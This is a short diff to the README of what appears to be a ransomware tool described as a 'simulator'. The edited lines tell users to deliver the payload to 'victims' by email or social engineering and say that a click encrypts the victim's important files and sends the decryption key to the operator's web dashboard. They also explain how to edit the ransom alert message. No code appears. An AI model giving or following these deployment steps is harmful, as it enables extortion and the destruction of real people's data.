@@ -144,9 +144,10 @@ What you need is a ransomware simulator that can safely encrypt some files on yo
 		 
 * ### Next Steps	
     * **Sending File to Victim's Pc** <br>
-	     * **Now, Send this Payload file to your victims through emails or any socail other engineering technique you want** <br>
-		 * **When Ever your victim click on paylaod file it will encrypt his all the important files and send the decryption key to your web dashboad** <br>
-		 * **For Custom alert message to your victims edit the HTML file inside "webpanel/altermsg.zip"* <br>
+	     * Now, Send this Payload file to your victims through emails or any socail other engineering technique you want <br>
+		 * When Ever our victim click on that paylaod file it will encrypt all important files and send the decryption key to our web dashboard <br>
+		 * For Custom alert message to your victims, edit the HTML file inside "webpanel/altermsg.zip" <br>
+* ### Decryption Process			  
          
   
 <!-- https://github.com/Ileriayo/markdown-badges-->
